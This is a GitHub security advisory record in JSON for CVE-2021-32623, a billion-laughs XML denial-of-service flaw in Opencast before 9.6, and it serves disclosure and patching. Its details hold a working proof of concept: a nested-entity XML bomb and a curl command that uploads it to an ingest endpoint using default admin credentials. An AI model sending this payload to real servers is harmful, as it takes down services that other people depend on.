{
  "id": "GHSA-9gwx-9cwp-5c2m",
  "summary": "Billion laughs attack (XML bomb)",
  "details": "### Impact\n\nOpencast is vulnerable to the [Billion laughs attack](https://en.wikipedia.org/wiki/Billion_laughs_attack)  which allows an attacker to easily execute a (seemingly permanent) denial of service attack, essentially taking down Opencast using a single HTTP request.\n\nConsider an XML file (`createMediaPackage.xml`) like this:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<!DOCTYPE lolz [\n <!ENTITY lol \"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum. \">\n <!ELEMENT title (#PCDATA)>\n <!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n <!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\">\n <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n <!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">\n]>\n<mediapackage xmlns=\"http://mediapackage.opencastproject.org\" id=\"d162d5b2-b54f-4400-a268-ee6565b0e6e7\" start=\"2020-01-23T23:08:37Z\">\n  <title>&lol5;</title>\n  <media/>\n  <metadata/>\n  <attachments/>\n  <publications/>\n</mediapackage>\n```\n\nThrowing this at Opencast will cause Opencast to parse the XML and expand the Lorem Ipsum about 100\u00a0000 times, instantly consuming a huge amount of memory:\n\n```sh\ncurl -i -u admin:opencast https://develop.opencast.org/ingestdownload/ingestdownload \\\n  -F 'mediapackage=<createMediaPackage.xml' \\\n  -F sourceFlavors=\"\" \\\n  -F sourceTags=\"\" \\\n  -F deleteExternal=\"\" \\\n  -F tagsAndFlavor='' \\\n  -o out.xml\n```\n\nAdditional notes:\n\n- You can likely use other endpoints accepting XML (this was just the first one I tried) and depending on how much memory you want to consume, you might want to enlarge the lorem ipsum text.\n- Opencast's XML parser does limit the expansion to 100\u00a0000 times, already limiting the attack. Nevertheless, this can already harm the system. \n- To exploit this, users need to have ingest privileges, limiting the group of potential attackers\n\n### Patches\n\nThe problem has been fixed in Opencast 9.6. Older versions of Opencast are not patched sue to the extent of this patch.\n\n### Workarounds\n\nThere is no known workaround for this issue.\n\n### References\n\n- [Billion laughs attack explained](https://en.wikipedia.org/wiki/Billion_laughs_attack)\n- For technical details, take a look at the patch fixing the issue: https://github.com/opencast/opencast/commit/_________\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Open an issue in [our issue tracker](https://github.com/opencast/opencast/issues)\n- Email us at [security@opencast.org](mailto:security@opencast.org)",
  "aliases": [
    "CVE-2021-32623"
  ],
  "modified": "2022-03-02T05:21:44.428755Z",
  "published": "2021-06-17T20:11:35Z",
  "database_specific": {
    "cwe_ids": [
      "CWE-776"
    ],
    "severity": "HIGH",
    "github_reviewed": true
  },
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/opencast/opencast/security/advisories/GHSA-9gwx-9cwp-5c2m"
    },
    {
      "type": "ADVISORY",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-32623"
    },
    {
      "type": "WEB",
      "url": "https://github.com/opencast/opencast/commit/16b0d641713fe31b8518fcf14fc5e4e815d81206"
    },
    {
      "type": "WEB",
      "url": "https://github.com/opencast/opencast/commit/8ae27da5a6f658011a5741b3210e715b0dc6213e"
    },
    {
      "type": "PACKAGE",
      "url": "https://github.com/opencast/opencast"
    }
  ],
  "affected": [
    {
      "package": {
        "name": "org.opencastproject:opencast-kernel",
        "ecosystem": "Maven",
        "purl": "pkg:maven/org.opencastproject/opencast-kernel"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "0"
            },
            {
              "fixed": "9.6"
            }
          ]
        }
      ],
      "versions": [
        "6.6",
        "7.2",
        "7.3",
        "7.4",
        "7.5",
        "7.6",
        "7.7",
        "7.8",
        "7.9",
        "8.0",
        "8.1",
        "8.10",
        "8.11",
        "8.3",
        "8.4",
        "8.5",
        "8.6",
        "8.7",
        "8.8",
        "8.9",
        "9.0",
        "9.1",
        "9.2",
        "9.3",
        "9.4",
        "9.5"
      ],
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2021/06/GHSA-9gwx-9cwp-5c2m/GHSA-9gwx-9cwp-5c2m.json"
      }
    }
  ],
  "schema_version": "1.2.0",
  "severity": [
    {
      "type": "CVSS_V3",
      "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H"
    }
  ]
}